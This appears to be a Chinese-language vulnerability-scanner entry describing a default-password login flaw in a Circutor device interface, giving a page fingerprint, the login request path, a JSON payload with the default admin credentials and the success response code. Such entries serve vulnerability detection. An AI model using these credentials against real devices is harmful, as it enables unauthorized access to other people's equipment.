# circutorlogin存在默认口令登录漏洞

circutorlogin ｜ 默认口令 ｜ —
- **指纹**：`body="Line-TCPRS1"`
- **请求**：`POST /api/v1/login HTTP/1.1`

**Payload**
```
{"Username":"admin","Password":"circutor"}
```
- **响应特征**：200